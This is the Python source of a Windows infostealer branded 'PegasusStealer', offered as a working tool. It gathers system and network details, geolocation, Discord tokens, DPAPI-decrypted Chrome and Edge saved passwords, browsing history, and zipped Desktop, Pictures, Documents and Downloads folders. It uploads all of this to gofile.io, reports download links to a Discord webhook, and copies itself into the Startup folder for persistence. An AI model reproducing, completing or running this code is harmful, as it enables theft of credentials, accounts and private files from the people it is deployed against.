import requests, subprocess, sqlite3, random, base64, re, time, shutil, os
from Cryptodome.Cipher import AES
import win32crypt, json
from datetime import datetime, timedelta
import zipfile
import sys
from requests_toolbelt.multipart.encoder import MultipartEncoder, MultipartEncoderMonitor
import psutil
import platform
import wmi
import csv


def get_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        data = response.json()
        ip_address = data['ip']
        return ip_address
    except Exception as e:
        return None
    
ip_list = {''}
    
ip = get_ip()

if ip in ip_list:
    print("Ip Of the creator detected")
    sys.exit()

webhook = "Webhook Here"
def pcinformation():
    def get_ipconfig_output():
        ipconfig_result = subprocess.run(["ipconfig", "/all"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return ipconfig_result.stdout.strip()

    def get_all_user():
        alluser = subprocess.run(["net", "user"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return alluser.stdout.strip()

    def get_all_Wifi():
        allWifi = subprocess.run(["netsh", "wlan", "show", "profile"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return allWifi.stdout.strip()

    def get_mac():
        try:
            result = subprocess.run(["ipconfig", "/all"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                output_lines = result.stdout.splitlines()
                mac_address = None
                for line in output_lines:
                    if "Physical Address" in line or "Adresse physique" in line:
                        mac_address = line.split(":")[-1].strip()
                        if mac_address:
                            break
                return mac_address
            else:
                return None
        except Exception as e:
            return None

    def create_txt_file(content, file_name):
        header = "----------------------- PegasusStealer By It's Me -----------------------\n\n"
        file_content = header + content
        file_path = os.path.join(local_appdata_path, file_name)
        with open(file_path, "w", encoding='utf-8') as file:
            file.write(file_content)
        return file_path

    def get_ip_address():
        try:
            response = requests.get('https://api.ipify.org?format=json')
            data = response.json()
            ip_address = data['ip']
            return ip_address
        except Exception as e:
            return None

    def get_hwid():
        cmd = 'wmic csproduct get uuid'
        hwid = subprocess.check_output(cmd).decode().split('\n')[1].strip()
        return hwid

    def get_server():
        response = requests.get("https://api.gofile.io/getServer")
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'ok':
                return data['data']['server']
        else:
            response.raise_for_status()

    def upload_file(file_path):
        server = get_server()
        upload_url = f"https://{server}.gofile.io/uploadFile"
        
        def create_callback(encoder):
            encoder_len = encoder.len
            def callback(monitor):
                progress = monitor.bytes_read / encoder_len
            return callback

        with open(file_path, 'rb') as f:
            encoder = MultipartEncoder(fields={'file': (os.path.basename(file_path), f, 'application/octet-stream')})
            monitor = MultipartEncoderMonitor(encoder, create_callback(encoder))
            response = requests.post(upload_url, data=monitor, headers={'Content-Type': monitor.content_type})

        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'ok':
                return data['data']['downloadPage']
        else:
            response.raise_for_status()

    def get_graphics_card_name():
        if platform.system() == "Windows":
            c = wmi.WMI()
            for gpu in c.Win32_VideoController():
                return gpu.Name
            return "Unknown"
        elif platform.system() == "Darwin":
            return platform.machine()
        elif platform.system() == "Linux":
            if os.path.exists('/proc/driver/nvidia/gpus/'):
                for gpu_dir in os.listdir('/proc/driver/nvidia/gpus/'):
                    with open(os.path.join('/proc/driver/nvidia/gpus/', gpu_dir, 'information')) as f:
                        for line in f:
                            if line.startswith('Model:'):
                                return line.split(':')[-1].strip()
            else:
                for line in os.popen('lspci -vnn | grep VGA -A 12').read().strip().split('\n'):
                    if "Subsystem:" in line:
                        return line.split(" ")[-1]
        else:
            return "Unknown platform"

    graphics_card = get_graphics_card_name()


    def get_cpu_name():
        try:
            c = wmi.WMI()
            for cpu in c.Win32_Processor():
                return f"{cpu.Name} {cpu.MaxClockSpeed} MHz"
        except Exception as e:
            return None
    
    cpu_name = get_cpu_name()

    def get_motherboard_name():
        try:
            c = wmi.WMI()
            for board in c.Win32_BaseBoard():
                manufacturer = board.Manufacturer.strip()
                product = board.Product.strip()
                return f"{manufacturer} {product}"
        except Exception as e:
            return None

    motherboard_name = get_motherboard_name()


        


    local_appdata_path = os.getenv('LOCALAPPDATA')

    ip_output = get_ipconfig_output()
    user_output = get_all_user()
    wifi_output = get_all_Wifi()

    name = os.getlogin()
    txt_file_path_ip = create_txt_file(ip_output, f"WindowsIp_{name}.txt")
    txt_file_path_user = create_txt_file(user_output, f"WindowsUser_{name}.txt")
    txt_file_path_wifi = create_txt_file(wifi_output, f"WindowsWifi_{name}.txt")

    download_link_ip = upload_file(txt_file_path_ip)
    download_link_user = upload_file(txt_file_path_user)
    download_link_wifi = upload_file(txt_file_path_wifi)

    os.remove(txt_file_path_ip)
    os.remove(txt_file_path_user)
    os.remove(txt_file_path_wifi)

    ip_address = get_ip_address()
    hwid = get_hwid()
    mac = get_mac()
    hostname_result = subprocess.run(["hostname"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    pc_name = hostname_result.stdout.strip()
    name = os.getlogin()


    embed = {
        "title": "PC Information",
        "description": (
            f"**PC Name:** `{pc_name}`\n"
            f"**IP Address:** `{ip_address}`\n"
            f"**HWID:** `{hwid}`\n"
            f"**MAC Address:** `{mac}`\n"
            f"**Cpu Name :** `{cpu_name}`\n"
            f"**Graphique Card Name :** `{graphics_card}`\n"
            f"**Mother Board Info :** `{motherboard_name}`\n"
            f"**Victim Name:** `{name}`\n"
            f"**Windows IP Info:** [Download Link]({download_link_ip})\n"
            f"**All Users:** [Download Link]({download_link_user})\n"
            f"**All Wifi:** [Download Link]({download_link_wifi})"
        ),
        "color": 0x800080,
        "footer": {"text": "PegasusStealer By It's Me - Best Stealer"}
    }

    payload = {
        "username": "PegasusStealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1253413200649785515/1254167615514083521/Capture_decran_2024-06-22_221354.png",
        "embeds": [embed]
    }

    response = requests.post(webhook, json=payload)
    response.raise_for_status()

pcinformation()

def location():
    def get_ip():
        try:
            response = requests.get('https://api.ipify.org?format=json')
            data = response.json()
            ip_address = data['ip']
            return ip_address
        except Exception as e:
            return None

    def get_location(ip):
        url = f'https://ipapi.co/{ip}/json/'
        retries = 3 
        backoff_factor = 5

        for attempt in range(retries):
            try:
                response = requests.get(url)
                response.raise_for_status()
                location_data = response.json()
                return location_data
            except requests.RequestException as e:
                if response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 10))
                    time.sleep(retry_after + backoff_factor * attempt)
                else:
                    break
        return None

    ip = get_ip()
    location_data = get_location(ip)
    if location_data:
        embed = {
                "title": "Localisation data",
                "description": (
                f"**IP:** `{location_data.get('ip', 'N/A')}`\n"
                f"**Network:** `{location_data.get('network', 'N/A')}`\n"
                f"**Version:** `{location_data.get('version', 'N/A')}`\n"
                f"**City:** `{location_data.get('city', 'N/A')}`\n"
                f"**Region:** `{location_data.get('region', 'N/A')}`\n"
                f"**Region Code:** `{location_data.get('region_code', 'N/A')}`\n"
                f"**Country:** `{location_data.get('country', 'N/A')}`\n"
                f"**Country Name:** `{location_data.get('country_name', 'N/A')}`\n"
                f"**Country Code:** `{location_data.get('country_code', 'N/A')}`\n"
                f"**Country Code ISO3:** `{location_data.get('country_code_iso3', 'N/A')}`\n"
                f"**Country Capital:** `{location_data.get('country_capital', 'N/A')}`\n"
                f"**Country TLD:** `{location_data.get('country_tld', 'N/A')}`\n"
                f"**Continent Code:** `{location_data.get('continent_code', 'N/A')}`\n"
                f"**Timezone:** `{location_data.get('timezone', 'N/A')}`\n"
                f"**Country Calling Code:** `{location_data.get('country_calling_code', 'N/A')}`\n"
                f"**Currency:** `{location_data.get('currency', 'N/A')}`\n"
                f"**Currency Name:** `{location_data.get('currency_name', 'N/A')}`\n"
                f"**Languages:** `{location_data.get('languages', 'N/A')}`\n"
                f"**Country Area:** `{location_data.get('country_area', 'N/A')}`\n"
                f"**Country Population:** `{location_data.get('country_population', 'N/A')}`\n"
                f"**ASN:** `{location_data.get('asn', 'N/A')}`\n"
                f"**Organization:** `{location_data.get('org', 'N/A')}`"
            ),
            "color": 0x800080,
            "footer": {"text": "PegasusStealer By It's Me - Best Stealer"}
        }

        payload = {
            "username": "PegasusStealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1253413200649785515/1254167615514083521/Capture_decran_2024-06-22_221354.png",
            "embeds": [embed]
        }

        return payload


response = requests.post(webhook, json=location())
response.raise_for_status()

def GetTokens():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    
    paths = {
        'Discord': os.path.join(roaming, 'Discord'),
        'Discord Canary': os.path.join(roaming, 'discordcanary'),
        'Discord PTB': os.path.join(roaming, 'discordptb'),
        'Google Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
        'Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
        'Vivaldi': os.path.join(local, 'Vivaldi', 'User Data', 'Default'),
        'Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default')
    }
    
    grabb = {}
    token_ids = set()
    
    for platform, path in paths.items():
        ldb_path = os.path.join(path, 'Local Storage', 'leveldb')
        
        if not os.path.exists(ldb_path):
            continue
        
        tokens = []
        
        for file_name in os.listdir(ldb_path):
            if not (file_name.endswith('.log') or file_name.endswith('.ldb')):
                continue
            
            with open(os.path.join(ldb_path, file_name), 'r', errors='ignore') as file:
                for line in file:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            token_id = token.split('.')[0]
                            if token_id not in token_ids:
                                token_ids.add(token_id)
                                tokens.append(token)
        
        if tokens:
            grabb[platform] = tokens
    
    if not grabb:
        return None
    
    all_tokens = []
    for platform, tokens in grabb.items():
        all_tokens.extend(tokens)
    
    embed = {
        "title": "Token Information",
        "description": (
            f"**Tokens**: :japanese_ogre:`{', '.join(all_tokens)}`"
            ),
        "color": 0x800080,
        "footer": {"text": "PegasusStealer By It's Me- Best Stealer"}
    } 

    payload = {
        "username": "PegasusStealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1253413200649785515/1254167615514083521/Capture_decran_2024-06-22_221354.png",
        "embeds": [embed]
    }

    return payload

response = requests.post(webhook, json=GetTokens())
response.raise_for_status()

def get_Browser_Info():
    def get_secret_key(chrome_local_state_path):
        try:
            with open(chrome_local_state_path, "r", encoding='utf-8') as f:
                local_state = json.loads(f.read())
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            return None

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            return decrypted_pass.decode()
        except Exception as e:
            return ""

    def get_db_connection(chrome_login_db_path):
        try:
            shutil.copy2(chrome_login_db_path, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            return None

    def get_all_user_profiles():
        user_profiles_path = os.path.normpath(r"C:\Users")
        return [os.path.join(user_profiles_path, user) for user in os.listdir(user_profiles_path) if os.path.isdir(os.path.join(user_profiles_path, user))]

    def get_all_browser_paths(user_path):
        browsers = ["Google\\Chrome", "Microsoft\\Edge"]
        paths = []
        for browser in browsers:
            chrome_path_local_state = os.path.join(user_path, "AppData\\Local", browser, "User Data\\Local State")
            chrome_path = os.path.join(user_path, "AppData\\Local", browser, "User Data")
            if os.path.exists(chrome_path_local_state):
                paths.append((chrome_path_local_state, chrome_path))
        return paths

    def create_txt_file(content, file_name):
        header = "----------------------- PegasusStealer By It's Me -----------------------\n\n"
        file_content = header + content
        file_path = os.path.join(local_appdata_path, file_name)
        with open(file_path, "w", encoding='utf-8') as file:
            file.write(file_content)
        return file_path

    def get_server():
        response = requests.get("https://api.gofile.io/getServer")
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'ok':
                return data['data']['server']
        else:
            response.raise_for_status()

    def upload_file(file_path):
        server = get_server()
        upload_url = f"https://{server}.gofile.io/uploadFile"

        def create_callback(encoder):
            encoder_len = encoder.len
            def callback(monitor):
                progress = monitor.bytes_read / encoder_len
            return callback

        with open(file_path, 'rb') as f:
            encoder = MultipartEncoder(fields={'file': (os.path.basename(file_path), f, 'application/octet-stream')})
            monitor = MultipartEncoderMonitor(encoder, create_callback(encoder))
            response = requests.post(upload_url, data=monitor, headers={'Content-Type': monitor.content_type})

        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'ok':
                return data['data']
        else:
            response.raise_for_status()

    local_appdata_path = os.getenv('LOCALAPPDATA')

    all_user_profiles = get_all_user_profiles()
    
    with open(os.path.join(local_appdata_path, 'decrypted_passwords.csv'), mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(["index", "url", "username", "password"])
        for user_profile in all_user_profiles:
            browser_paths = get_all_browser_paths(user_profile)
            for chrome_path_local_state, chrome_path in browser_paths:
                secret_key = get_secret_key(chrome_path_local_state)
                if secret_key:
                    profiles = [p for p in os.listdir(chrome_path) if re.search("^Profile*|^Default$", p)]
                    for profile in profiles:
                        chrome_login_db_path = os.path.join(chrome_path, profile, "Login Data")
                        conn = get_db_connection(chrome_login_db_path)
                        if conn:
                            cursor = conn.cursor()
                            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                            for index, login in enumerate(cursor.fetchall()):
                                url, username, ciphertext = login
                                if url and username and ciphertext:
                                    decrypted_password = decrypt_password(ciphertext, secret_key)
                                    csv_writer.writerow([index, url, username, decrypted_password])
                            cursor.close()
                            conn.close()
                            os.remove("Loginvault.db")

    with open(os.path.join(local_appdata_path, 'browsing_history.csv'), mode='w', newline='', encoding='utf-8') as history_file:
        csv_writer = csv.writer(history_file, delimiter=',')
        csv_writer.writerow(["index", "url", "title", "visit_count", "last_visit_time"])
        for user_profile in all_user_profiles:
            browser_paths = get_all_browser_paths(user_profile)
            for chrome_path_local_state, chrome_path in browser_paths:
                secret_key = get_secret_key(chrome_path_local_state)
                if secret_key:
                    profiles = [p for p in os.listdir(chrome_path) if re.search("^Profile*|^Default$", p)]
                    for profile in profiles:
                        chrome_history_db_path = os.path.join(chrome_path, profile, "History")
                        conn = get_db_connection(chrome_history_db_path)
                        if conn:
                            cursor = conn.cursor()
                            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                            for index, history in enumerate(cursor.fetchall()):
                                url, title, visit_count, last_visit_time = history
                                csv_writer.writerow([index, url, title, visit_count, last_visit_time])
                            cursor.close()
                            conn.close()
                            os.remove("Loginvault.db")

    with open(os.path.join(local_appdata_path, 'decrypted_passwords.csv'), 'r', encoding='utf-8') as file:
        password_content = file.read()

    with open(os.path.join(local_appdata_path, 'browsing_history.csv'), 'r', encoding='utf-8') as file:
        history_content = file.read()

    name = os.getlogin()
    txt_file_password_path = create_txt_file(password_content, f"Passwords_{name}.txt")
    txt_file_history_path = create_txt_file(history_content, f"Browsing_History_{name}.txt")

    upload_data_password = upload_file(txt_file_password_path)
    upload_data_history = upload_file(txt_file_history_path)

    os.remove(txt_file_password_path)
    os.remove(txt_file_history_path)
    os.remove(os.path.join(local_appdata_path, 'decrypted_passwords.csv'))
    os.remove(os.path.join(local_appdata_path, 'browsing_history.csv'))


    if upload_data_password and upload_data_history:
        download_link_password = upload_data_password['downloadPage']
        download_link_history = upload_data_history['downloadPage']
        embed = {
            "title": "Browser Information",
            "description": (
                f"**Browsing Passwords**: [Download Link]({download_link_password})\n"
                f"**Browsing History**: [Download Link]({download_link_history})"
            ),
            "color": 0x800080,
            "footer": {"text": "PegasusStealer By It's Me - Best Stealer"}
        }
    else:
        embed = {
            "title": "Browser Information",
            "description": "No Browser Info",
            "color": 0x800080,
            "footer": {"text": "PegasusStealer By It's Me - Best Stealer"}
        }

    payload = {
        "username": "PegasusStealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1253413200649785515/1254167615514083521/Capture_decran_2024-06-22_221354.png",
        "embeds": [embed]
    }

    return payload

response = requests.post(webhook, json=get_Browser_Info())
response.raise_for_status()

def file_dump():
    def zip_folder_contents(zip_filename, folder_path, max_size_mb):
        total_size = 0
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for root, _, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
                    if total_size + file_size_mb <= max_size_mb:
                        zipf.write(file_path, os.path.relpath(file_path, folder_path))
                        total_size += file_size_mb
                    else:
                        return

    def get_server():
        response = requests.get("https://api.gofile.io/getServer")
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'ok':
                return data['data']['server']
        else:
            response.raise_for_status()

    def upload_file(file_path):
        server = get_server()
        upload_url = f"https://{server}.gofile.io/uploadFile"

        def create_callback(encoder):
            encoder_len = encoder.len
            def callback(monitor):
                progress = monitor.bytes_read / encoder_len
            return callback

        with open(file_path, 'rb') as f:
            encoder = MultipartEncoder(fields={'file': (os.path.basename(file_path), f, 'application/octet-stream')})
            monitor = MultipartEncoderMonitor(encoder, create_callback(encoder))
            response = requests.post(upload_url, data=monitor, headers={'Content-Type': monitor.content_type})

        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'ok':
                return data['data']
        else:
            response.raise_for_status()

    name = os.getlogin()
    local_appdata_path = os.getenv('LOCALAPPDATA')
    zip_filename_desktop = os.path.join(local_appdata_path, f"desktop_contents_{name}.zip")
    zip_filename_images = os.path.join(local_appdata_path, f"images_contents_{name}.zip")
    zip_filename_documents = os.path.join(local_appdata_path, f"documents_contents_{name}.zip")
    zip_filename_downloads = os.path.join(local_appdata_path, f"downloads_contents_{name}.zip")
    max_zip_size_mb = 400

    desktop_path = os.path.expanduser("~/Desktop")
    images_path = os.path.expanduser("~/Pictures")
    documents_path = os.path.expanduser("~/Documents")
    downloads_path = os.path.expanduser("~/Downloads")

    zip_folder_contents(zip_filename_desktop, desktop_path, max_zip_size_mb)
    zip_folder_contents(zip_filename_images, images_path, max_zip_size_mb)
    zip_folder_contents(zip_filename_documents, documents_path, max_zip_size_mb)
    zip_folder_contents(zip_filename_downloads, downloads_path, max_zip_size_mb)

    upload_data_desktop = upload_file(zip_filename_desktop)
    upload_data_images = upload_file(zip_filename_images)
    upload_data_documents = upload_file(zip_filename_documents)
    upload_data_downloads = upload_file(zip_filename_downloads)

    os.remove(zip_filename_desktop)
    os.remove(zip_filename_images)
    os.remove(zip_filename_documents)
    os.remove(zip_filename_downloads)

    if upload_data_desktop and upload_data_images and upload_data_documents and upload_data_downloads:
        download_link_desktop = upload_data_desktop['downloadPage']
        download_link_images = upload_data_images['downloadPage']
        download_link_documents = upload_data_documents['downloadPage']
        download_link_downloads = upload_data_downloads['downloadPage']

        embed = {
            "title": "File Dumps",
            "description": f"**Desktop Files**: [Download Link]({download_link_desktop})\n"
                           f"**Image Files**: [Download Link]({download_link_images})\n"
                           f"**Documents Files**: [Download Link]({download_link_documents})\n"
                           f"**Downloads Files**: [Download Link]({download_link_downloads})",
            "color": 0x800080,
            "footer": {"text": "PegasusStealer By It's Me - Best Stealer"}
        }
    else:
        embed = {
            "title": "File Dumps",
            "description": "Failed to upload files",
            "color": 0x800080,
            "footer": {"text": "PegasusStealer By It's Me - Best Stealer"}
        }

    payload = {
        "username": "PegasusStealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1253413200649785515/1254167615514083521/Capture_decran_2024-06-22_221354.png",
        "embeds": [embed]
    }

    return payload

response = requests.post(webhook, json=file_dump())
response.raise_for_status()

def injection():
    app_version = "1.0.9003"
    core_version = "1.0.0"

    appdata = os.getenv('APPDATA')

    acces_directory = os.path.join(
        appdata.replace("Roaming", "Local"),
        "Discord",
        f"app-{app_version}",
        "modules",
        f"discord_desktop_core-{core_version}",
        "discord_desktop_core",
        "index.js"
    )

    code = f'''
'''



def move_executed_file(destination_directory):
    current_file_path = os.path.realpath(__file__)
    file_name = os.path.basename(current_file_path)
    destination_path = os.path.join(destination_directory, file_name)
    
    shutil.move(current_file_path, destination_path)

user_home_directory = os.path.expanduser('~')
destination_directory = os.path.join(user_home_directory, r'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')

move_executed_file(destination_directory)
